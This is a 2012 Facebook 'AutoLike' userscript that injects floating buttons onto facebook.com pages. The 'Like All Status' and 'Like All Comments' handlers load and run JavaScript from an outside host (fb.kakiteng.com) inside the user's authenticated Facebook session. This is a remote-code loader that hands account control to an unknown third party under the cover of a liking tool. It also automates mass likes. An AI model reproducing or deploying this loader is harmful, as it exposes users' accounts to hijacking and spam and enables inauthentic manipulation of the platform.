// ==UserScript==
// @name			Facebook AutoLike "Special Sumpah Pemuda"
// @namespace		        auto_like_facebook
// @description		        Auto Like Facebook by Thankyou.NJB
// @author			Thankyou.NJB
// @authorURL		        http://www.facebook.com/ajiluckyboy
// @homepage		        http://www.facebook.com/ajiluckyboy
// @include			htt*://www.facebook.com/*
// @version			28 Oktober 2012
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 		        htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

// ==============
body = document.body;
if(body != null) {div = document.createElement("div");div.setAttribute('id','like2');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px"; div.style.opacity= 0.90;div.style.bottom = "+140px";div.style.left = "+8px";div.style.backgroundColor = "#C4F7A2";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#10F0E5' onclick='AutoLike()'><center>Like All Status</center></a></a>"
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//fb.kakiteng.com/las",b.body.appendChild(a);void(0);};}
body = document.body;
if(body != null) {div = document.createElement("div");div.setAttribute('id','like3');div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+119px";div.style.left = "+8px";div.style.backgroundColor = "#FAF49E";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E6399B' onclick='LikeComments()'><center>Like All Comments</center></a>"
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="//fb.kakiteng.com/lac",b.body.appendChild(a);void(0);};}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+95px";div.style.left = "+8px";div.style.backgroundColor = "#E1BEFA";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#39E444' href='' title='Refresh'><blink><center>Refresh (F5)</center></blink></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+74px";div.style.left = "+8px";div.style.backgroundColor = "#BCF8F4";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#FF7C00' href='http://www.facebook.com' title='Beranda'><center>Beranda</center></a>"
body.appendChild(div);}
body = document.body;


